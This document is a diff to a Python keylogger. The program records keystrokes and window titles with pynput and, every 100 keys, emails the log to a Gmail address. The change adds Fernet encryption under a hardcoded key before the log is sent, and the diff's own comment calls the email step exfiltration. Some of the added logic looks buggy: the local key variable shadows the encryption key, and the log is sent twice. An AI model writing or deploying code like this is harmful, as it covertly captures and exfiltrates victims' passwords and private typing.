@@ -1,4 +1,6 @@
 import logging
+from cryptography.fernet import Fernet
+
 #listening for 
 from pynput.keyboard import Key, Listener
 
@@ -27,9 +29,9 @@ toaddr = "testingtemp568@gmail.com"
 
 #make a log file
 log_dir = "key_log.txt"
+e_log_dir = "e_key_log.txt"
 
-extend = "\\"
-file_merge = log_dir + extend
+key="_Xsx521ZIOq3YSE6Ox0EnBkG6Mv8DfPQ-eff0ZArPAQ="
 
 # exfil via email to testing gmail account
 def send_email(filename, attachment, toaddr):
@@ -74,6 +76,18 @@ logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format="%(asctime)s
 
 count = 0
 
+# encrypt log file
+def encrypt():
+    with open(log_dir, "rb") as f:
+        data = f.read()
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+
+        with open(e_log_dir, "wb") as f:
+            f.write(encrypted)
+
+        send_email(e_log_dir, e_log_dir, toaddr)
+
 # send email every 100 keystrokes
 def on_press(key):
     curr_window = get_active_window_title()
@@ -81,10 +95,12 @@ def on_press(key):
     global count
     count += 1
     if count == 100:
-        send_email(log_dir, log_dir, toaddr)
+        encrypt()
+        send_email(e_log_dir, e_log_dir, toaddr)
         count = 0
     if key == Key.esc:
         return False
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+
